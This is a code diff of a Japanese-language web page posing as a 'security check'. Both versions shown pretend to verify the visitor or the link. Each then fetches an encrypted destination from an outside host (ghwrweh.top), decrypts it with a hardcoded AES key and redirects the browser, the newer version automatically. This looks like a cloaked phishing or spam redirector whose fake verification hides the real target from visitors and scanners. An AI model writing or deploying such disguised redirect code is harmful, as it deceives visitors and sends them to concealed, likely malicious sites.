@@ -2,199 +2,59 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
-  <title>セキュリティチェック</title>
+  <title>セキュリティ確認中...</title>
   <meta name="robots" content="noindex,nofollow">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
-      background: #1a1a1a;
-      font-family: sans-serif;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .container {
-      background: white;
-      max-width: 500px;
-      padding: 30px 20px;
-      border-radius: 12px;
-      text-align: center;
-      box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
-    }
-    .icon {
-      font-size: 15px;
-      color: #f5a623;
-      margin-bottom: 10px;
-    }
-    h2 {
-      font-size: 18px;
-      font-weight: bold;
-      color: #000;
-      margin: 5px 0 15px;
-    }
-    p.subtitle {
-      color: #555;
-      font-size: 13px;
-      margin: 0 0 20px;
-    }
-    .box {
-      border: 1px solid #ddd;
-      border-radius: 10px;
-      padding: 15px;
-      background: #fafafa;
-      text-align: left;
-      position: relative;
-    }
-    .box-row {
-      display: flex;
-      align-items: center;
-      font-size: 14px;
-      margin-top: 10px;
-    }
-    .box-row label {
-      cursor: pointer;
-      color: #333;
-    }
-    .error-msg {
-      color: green;
-      font-size: 14px;
-      margin-left: 6px;
-    }
-    .error-icon {
-      color: red;
-      margin-right: 4px;
-    }
-    .verify-success {
-      color: green;
-      font-size: 14px;
-      display: none;
-    }
-    .loading {
-      display: inline-block;
-      width: 14px;
-      height: 14px;
-      border: 2px solid #eee;
-      border-top: 2px solid #888;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-left: 8px;
-      vertical-align: middle;
-    }
-    .links {
-      font-size: 12px;
-      color: #999;
-      display: flex;
-      justify-content: space-between;
-      margin-top: 10px;
-    }
-    .footer {
-      font-size: 11px;
-      color: #999;
-      margin-top: 20px;
-    }
-    input[type="checkbox"] {
-      width: 20px;
-      height: 20px;
-      margin-right: 8px;
-      appearance: none;
-      border: 1px solid #ccc;
-      border-radius: 3px;
-      vertical-align: middle;
-      background-color: white;
-    }
-    input[type="checkbox"]:checked::before {
-      content: "✓";
-      display: block;
-      text-align: center;
-      color: white;
-      background-color: #00c853;
-      border-radius: 3px;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
+    body { text-align:center; font-family:sans-serif; padding-top:80px; background:#f9f9f9; }
+    .loader { margin:30px auto; border:6px solid #f3f3f3; border-top:6px solid #3498db;
+             border-radius:50%; width:50px; height:50px; animation:spin 1s infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .caption { color:#666; font-size:13px; margin-top:10px; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="icon">🛡️ <span style="color:#f5a623;">セキュリティチェック</span></div>
-    <h2>ロボットではないことを確認してください</h2>
-    <p class="subtitle">自動化された攻撃からサービスを保護するため、以下の確認を行ってください</p>
-
-    <div class="box">
-      <div id="error" style="display:none;" class="box-row">
-        <span class="error-icon">❌</span>
-        <span class="error-msg">取得中にエラーが発生しました。</span>
-      </div>
-
-      <div id="verify-box" class="box-row">
-        <input type="checkbox" id="check">
-        <label for="check">セキュリティ確認</label>
-      </div>
-
-      <div id="success-msg" class="verify-success">
-        ✅ 検証に成功しました。リダイレクト中... <span class="loading"></span>
-      </div>
-
-      <div class="links">
-        <span>✅ セキュリティ確認</span>
-        <span>プライバシー・利用規約</span>
-      </div>
-    </div>
-
-    <div class="footer">この確認は不正なアクセスからサービスを守るためのものです</div>
-  </div>
+  <h2>セキュリティ確認中...</h2>
+  <p>リンクの安全性を確認しています。まもなくリダイレクトします。</p>
+  <div class="loader"></div>
+  <p class="caption">セキュア認証サービス</p>
 
   <script>
     const AES_KEY = "5Ctianyoumabiiii";
-    const path = location.pathname.split("/").filter(Boolean);
-    const encryptedId = path[path.length - 1];
+    const id = location.pathname.split("/").pop();
 
-    document.getElementById("check").addEventListener("change", async function () {
-      const errorBox = document.getElementById("error");
-      const successBox = document.getElementById("success-msg");
-      const verifyBox = document.getElementById("verify-box");
-
-      errorBox.style.display = "none";
-
-      if (this.checked) {
-        verifyBox.style.display = "none";
-        successBox.style.display = "block";
-
-        const id = await decryptAES(encryptedId);
-        if (!id) {
-          successBox.style.display = "none";
-          errorBox.style.display = "flex";
-          return;
-        }
-
-        try {
-          const res = await fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(id));
-          const json = await res.json();
-          const url = json?.data?.siteUrl;
-          if (!url) throw new Error("No URL");
-          setTimeout(() => {
-            location.href = url;
-          }, 2000);
-        } catch {
-          successBox.style.display = "none";
-          errorBox.style.display = "flex";
-        }
-      }
-    });
+    if (!id) {
+      document.body.innerHTML = "<h3>無効なIDです</h3>";
+    } else {
+      fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(id))
+        .then(r => r.json())
+        .then(data => {
+          const enc = data?.data?.siteUrl;
+          if (enc) {
+            decryptAES(enc).then(url => {
+              if (url) {
+                setTimeout(() => location.href = url, 3000);
+              } else {
+                document.body.innerHTML += "<p>復号に失敗しました。</p>";
+              }
+            });
+          } else {
+            document.body.innerHTML += "<p>IDが存在しません。</p>";
+          }
+        })
+        .catch(() => {
+          document.body.innerHTML += "<p>サーバーエラーが発生しました。</p>";
+        });
+    }
 
     async function decryptAES(encText) {
       try {
-        const b64 = encText.replace(/-/g, '+').replace(/_/g, '/');
+        const b64 = encText.replace(/-/g,'+').replace(/_/g,'/');
         const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
-        const iv = bytes.slice(0, 16);
-        const data = bytes.slice(16);
+        const iv = bytes.slice(0,16), data = bytes.slice(16);
         const key = await crypto.subtle.importKey("raw",
-          new TextEncoder().encode(AES_KEY), { name: "AES-CBC" }, false, ["decrypt"]);
-        const dec = await crypto.subtle.decrypt({ name: "AES-CBC", iv }, key, data);
+          new TextEncoder().encode(AES_KEY), {name:"AES-CBC"}, false, ["decrypt"]);
+        const dec = await crypto.subtle.decrypt({name:"AES-CBC", iv}, key, data);
         return new TextDecoder().decode(dec).replace(/\u0000+$/, "");
       } catch {
         return null;
